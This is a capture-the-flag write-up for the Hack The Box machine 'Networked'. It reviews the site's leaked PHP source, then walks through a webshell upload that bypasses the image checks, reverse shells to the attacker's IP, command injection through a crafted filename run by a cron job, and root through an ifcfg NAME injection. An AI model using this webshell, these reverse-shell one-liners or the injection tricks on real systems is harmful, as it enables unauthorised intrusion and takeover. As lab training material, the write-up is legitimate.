# Networked - Easy

```sh
sudo vim /etc/hosts
# add networked.htb

nmap -T4 -p- -A -Pn -v networked.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.4
    * 80/tcp - http - Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)

* the webpage on port 80 includes a message - "Hello mate, we're building the new FaceMash! Help by funding us and be the new Tyler&Cameron! Join us at the pool party this Sat to get a glimpse" - no other content is available on the webpage

* checking the source code, a comment is included - "upload and gallery not yet linked" - indicating other pages

* web enumeration:

    ```sh
    gobuster dir -u http://networked.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,jpg,png,js -t 25
    # dir scan with small wordlist and common extensions

    ffuf -c -u 'http://networked.htb' -H 'Host: FUZZ.networked.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 229 -s
    # subdomain scan
    ```

* ```gobuster``` scan finds the following pages:

    * /backup - this includes a file 'backup.tar'

    * /lib.php - no content, but the page exists

    * /photos.php - this is the gallery page, and has links to PNG files uploaded in '/uploads' - the images are just the CentOS logo

    * /upload.php - a simple upload form; this could be linked to '/uploads'

    * /uploads - no content, no dir listing, but the page exists

* we can download the 'backup.tar' file and check it:

    ```sh
    tar -xf backup.tar

    ls -la
    # PHP files for website extracted
    ```

* we have 4 PHP files - 'index.php', 'lib.php', 'photos.php' & 'upload.php'

* 'index.php' code is for the main page, so it does not include anything useful

* checking rest of the PHP scripts for the core logic of the website:

    * 'lib.php':

        ```php
        <?php

        function getnameCheck($filename) {
        $pieces = explode('.',$filename);
        $name= array_shift($pieces);
        $name = str_replace('_','.',$name);
        $ext = implode('.',$pieces);
        #echo "name $name - ext $ext\n";
        return array($name,$ext);
        }

        function getnameUpload($filename) {
        $pieces = explode('.',$filename);
        $name= array_shift($pieces);
        $name = str_replace('_','.',$name);
        $ext = implode('.',$pieces);
        return array($name,$ext);
        }

        function check_ip($prefix,$filename) {
        //echo "prefix: $prefix - fname: $filename<br>\n";
        $ret = true;
        if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
            $ret = false;
            $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
        } else {
            $msg = $filename;
        }
        return array($ret,$msg);
        }

        function file_mime_type($file) {
        $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
        if (function_exists('finfo_file')) {
            $finfo = finfo_open(FILEINFO_MIME);
            if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
            {
            $mime = @finfo_file($finfo, $file['tmp_name']);
            finfo_close($finfo);
            if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
                $file_type = $matches[1];
                return $file_type;
            }
            }
        }
        if (function_exists('mime_content_type'))
        {
            $file_type = @mime_content_type($file['tmp_name']);
            if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
            {
            return $file_type;
            }
        }
        return $file['type'];
        }

        function check_file_type($file) {
        $mime_type = file_mime_type($file);
        if (strpos($mime_type, 'image/') === 0) {
            return true;
        } else {
            return false;
        }  
        }

        function displayform() {
        ?>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data">
        <input type="file" name="myFile">
        <br>
        <input type="submit" name="submit" value="go!">
        </form>
        <?php
        exit();
        }


        ?>
        ```

        * this script defines the helper functions for handling & validating image uploads

        * 'getnameCheck' function -

            * splits filename by ```.```
            * takes first part of filename, and replaces ```_``` with ```.```
            * then returns the filename array
            * e.g. - ```127_0_0_1.png``` gives the array ```["127.0.0.1","png"]
        
        * 'getnameUpload' function - same as 'getnameCheck' function

        * 'check_ip' function -

            * checks if ```$prefix``` is a valid IP
            * if ```$prefix``` is not a valid IP, it returns 'false', and a message for the filename saying it is not a valid IP
            * if ```$prefix``` is a valid IP, it returns 'true', and a message as the filename itself
        
        * 'file_mime_type' function -

            * uses ```finfo_file()``` to check file contents, and extracts MIME type - like 'image/png' - using regex
            * if ```finfo_file()``` fails to detect a MIME type, it uses ```mime_content_type()``` to detect MIME type
            * if this also fails, it returns the file type using ```$file['type']```
        
        * 'check_file_type' function -

            * this uses the 'file_mime_type' function defined earlier to get the MIME type
            * it checks if the MIME type starts with 'image/' or not
        
        * 'displayform' function -

            * for the upload form - using a POST request we can upload files

    * 'photos.php':

        ```php
        <?php
        require '/var/www/html/lib.php';
        $path = '/var/www/html/uploads/';
        $ignored = array('.', '..', 'index.html');
        $files = array();

        $i = 1;
        echo '<div class="tg-wrap"><table class="tg">'."\n";

        foreach (scandir($path) as $file) {
        if (in_array($file, $ignored)) continue;
        $files[$file] = filemtime($path. '/' . $file);
        }
        arsort($files);
        $files = array_keys($files);

        foreach ($files as $key => $value) {
        $exploded  = explode('.',$value);
        $prefix = str_replace('_','.',$exploded[0]);
        $check = check_ip($prefix,$value);
        if (!($check[0])) {
            continue;
        }
        // for HTB, to avoid too many spoilers
        if ((strpos($exploded[0], '10_10_') === 0) && (!($prefix === $_SERVER["REMOTE_ADDR"])) ) {
            continue;
        }
        if ($i == 1) {
            echo "<tr>\n";
        }

        echo '<td class="tg-0lax">';
        echo "uploaded by $check[1]<br>";
        echo "<img src='uploads/".$value."' width=100px>";
        echo "</td>\n";


        if ($i == 4) {
            echo "</tr>\n";
            $i = 1;
        } else {
            $i++;
        }
        }
        if ($i < 4 && $i > 1) {
            echo "</tr>\n";
        }
        ?>
        ```

        * this script is for file listing and displaying uploaded images

        * it loads 'lib.php' from ```/var/www/html/lib.php```, and sets the uploads path to ```/var/www/html/uploads```

        * then, it sorts the filenames in '/uploads' by most recent

        * next, it extracts the IP address from the filename and checks if it is valid using the 'check_ip' function

        * also, if the filename starts with "10_10_", and the IP from the filename does not match our IP (attacker IP), then the file is skipped - this is so that we get to see only our uploads

        * then, it creates a table with our IP and the names of the uploaded image files, and the image thumbnail

    * 'upload.php':

        ```php
        <?php
        require '/var/www/html/lib.php';

        define("UPLOAD_DIR", "/var/www/html/uploads/");

        if( isset($_POST['submit']) ) {
        if (!empty($_FILES["myFile"])) {
            $myFile = $_FILES["myFile"];

            if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
            echo '<pre>Invalid image file.</pre>';
            displayform();
            }

            if ($myFile["error"] !== UPLOAD_ERR_OK) {
                echo "<p>An error occurred.</p>";
                displayform();
                exit;
            }

            //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
            list ($foo,$ext) = getnameUpload($myFile["name"]);
            $validext = array('.jpg', '.png', '.gif', '.jpeg');
            $valid = false;
            foreach ($validext as $vext) {
            if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
                $valid = true;
            }
            }

            if (!($valid)) {
            echo "<p>Invalid image file</p>";
            displayform();
            exit;
            }
            $name = str_replace('.','_',$_SERVER['REMOTE_ADDR']).'.'.$ext;

            $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
            if (!$success) {
                echo "<p>Unable to save file.</p>";
                exit;
            }
            echo "<p>file uploaded, refresh gallery</p>";

            // set proper permissions on the new file
            chmod(UPLOAD_DIR . $name, 0644);
        }
        } else {
        displayform();
        }
        ?>
        ```

        * this script is for upload handling; it also loads 'lib.php' from ```/var/www/html/lib.php```, and sets the uploads path to ```/var/www/html/uploads```

        * it uses the 'check_file_type' function to check if the file MIME type starts with 'image/', and if the filesize is less than 60000 bytes

        * then it uses the 'getnameUpload' function to split the filename and its extension, to validate file extension with '.jpg', '.png', '.gif' and '.jpeg' - double extensions can be used to bypass this check

        * then it renames the filename to our IP, and appends the extension from earlier - and moves the image to the '/uploads' directory

        * it also sets the file permissions to '0644' to possibly avoid execution

* having the scripts for the website logic, we can attempt bypasses by using the double extension technique and modifying the MIME type:

    * firstly, we need a valid image file to be modified

    * intercept the image file upload at '/upload.php' using Burp Suite

    * here, we need to modify the image extension to a double extension like 'test.php.jpg'

    * also, include the actual PHP webshell code in the image file - to ensure the file bypasses the image check, we need to keep the first few lines of image data, then remove rest of the data, and include the PHP webshell code:

        ```php
        <?php

        if(isset($_REQUEST['cmd'])){
                echo "<pre>";
                $cmd = ($_REQUEST['cmd']);
                system($cmd);
                echo "</pre>";
                die;
        }

        ?>
        ```
    
    * after editing this request, we can forward it - and we can see that the upload form accepts this file

    * now, if we refresh the gallery at '/photos.php', the PHP file is uploaded as '10_10_14_95.php.jpeg'

    * we can test for RCE now using ```curl``` to check if the webshell can execute commands:

        ```sh
        curl http://networked.htb/uploads/10_10_14_95.php.jpeg?cmd=id
        # binary output, we need to use "--output -"

        curl http://networked.htb/uploads/10_10_14_95.php.jpeg?cmd=id --output -
        # this works, and we get the output of 'id'
        ```

* as we have RCE now, we can use it to get reverse shell:

    ```sh
    nc -nvlp 4444
    # setup listener

    curl http://networked.htb/uploads/10_10_14_95.php.jpeg?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.95%2F4444%200%3E%261 --output -
    # using the URL-encoded payload 'sh -i >& /dev/tcp/10.10.14.95/4444 0>&1'
    # this works, and we have reverse shell
    ```

* in reverse shell:

    ```sh
    id
    # 'apache' user

    pwd
    # /var/www/html/uploads

    ls -la

    ls -la /var/www/html

    cat /etc/passwd
    # we have a user 'guly'

    ls -la /home
    
    ls -la /home/guly

    # we can use linpeas for basic enum - fetch script from attacker

    cd /tmp

    curl http://10.10.14.95:8000/linpeas.sh -o linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 3.10.0-957.21.3.el7.x86_64
    * listening locally on port 25
    * non-default files found in ```/home/guly```
    * mails found in ```/var/mail/guly```

* first we can check the mails at ```/var/mail/guly```, but this gives permission denied error

* checking the files in 'guly' home directory, we have 'check_attack.php' and 'crontab.guly'

* the crontab file is to run the PHP script as a cronjob - ```*/3 * * * * php /home/guly/check_attack.php```

* checking the PHP script in 'guly' home directory:

    ```php
    <?php
    require '/var/www/html/lib.php';
    $path = '/var/www/html/uploads/';
    $logpath = '/tmp/attack.log';
    $to = 'guly';
    $msg= '';
    $headers = "X-Mailer: check_attack.php\r\n";

    $files = array();
    $files = preg_grep('/^([^.])/', scandir($path));

    foreach ($files as $key => $value) {
        $msg='';
    if ($value == 'index.html') {
        continue;
    }
    #echo "-------------\n";

    #print "check: $value\n";
    list ($name,$ext) = getnameCheck($value);
    $check = check_ip($name,$value);

    if (!($check[0])) {
        echo "attack!\n";
        # todo: attach file
        file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

        exec("rm -f $logpath");
        exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
        echo "rm -f $path$value\n";
        mail($to, $msg, $msg, $headers, "-F$value");
    }
    }

    ?>
    ```

    * this script also refers the helper functions from 'lib.php' and checks the uploads directory

    * it iterates through the files in the uploads directory, checks the IP from the filename

    * if the IP is invalid, the script considers it as an attack, and logs it into '/tmp/attack.log' - but the ```$msg``` var is empty

    * it also deletes the log file in the next line, which means nothing is done

    * then, it removes the 'malicious' file from the uploads directory, and prints the command
    
    * lastly, it sends a mail to 'guly' and includes an extra parameter ```$value``` - this is the filename, but passed as a parameter

* in the PHP script, the issue is as the ```$value``` parameter is unsanitised, and we can control it (since it is the filename from the uploads directory), we can use it for command injection

* we can try exploiting this by creating a malicious filename, which includes the command to be executed, and create the file in the uploads directory:

    * on attacker, setup another listener:

        ```sh
        nc -nvlp 5555
        ```
    
    * on target, move to uploads directory and create the malicious file - we can inject a revshell command in the name, such that the command is executed as the ```$value``` parameter from the cronjob script:

        ```sh
        cd /var/www/html/uploads

        ls -la
        # we have write permissions

        touch 'evil.jpg; nc -c sh 10.10.14.95 5555'
        # we need to escape some of the special chars
        ```
    
    * within 3 minutes, we get shell on our listener:

        ```sh
        # in second reverse shell
        id
        # 'guly' user
        ```

* as we have RCE as 'guly' now, we can check further for privesc:

    ```sh
    cd /home/guly

    # stabilise shell
    python -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    ls -la

    cat user.txt
    # user flag

    # we can check the mail now
    cat /var/mail/guly
    # this just mentions previous attempts from the cronjob

    sudo -l
    ```

* ```sudo -l``` shows that we can run this command as root - ```(root) NOPASSWD: /usr/local/sbin/changename.sh```

* checking this script:

    ```sh
    ls -la /usr/local/sbin/changename.sh

    cat /usr/local/sbin/changename.sh
    ```

    ```sh
    #!/bin/bash -p
    cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
    DEVICE=guly0
    ONBOOT=no
    NM_CONTROLLED=no
    EoF

    regexp="^[a-zA-Z0-9_\ /-]+$"

    for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
            echo "wrong input, try again"
            echo "interface $var:"
            read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
    done
    
    /sbin/ifup guly0
    ```

    * this script runs in privileged mode as ```-p``` flag is used

    * it creates a network config file at ```/etc/sysconfig/network-scripts/ifcfg-guly```, with interface name 'guly0'
    
    * the defined regex allows only alphabets, numbers, ```_```, ```/``` (escaped) and ```-``` for the user input

    * then, it loops over the config vars 'NAME', 'PROXY_METHOD', 'BROWSER_ONLY' and 'BOOTPROTO', and reads the variable values as user input

    * finally, it appends the variables to the same network config file, and brings up the interface using ```/sbin/ifup guly0```

* Googling for exploits associated with 'ifcfg network-scripts' leads to [this privesc vector using the NAME attribute in ifcfg config files for command injection](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

* we can abuse this command injection vulnerability to inject a malicious command after the whitespace separator:

    ```sh
    sudo /usr/local/sbin/changename.sh

    # for 'NAME' var input
    test sudo bash
    # so that the command 'sudo bash' gets executed

    # for rest of the inputs we can enter any value like 'no', 'none', etc.

    # this gives us root shell

    cat /root/root.txt
    # root flag
    ```
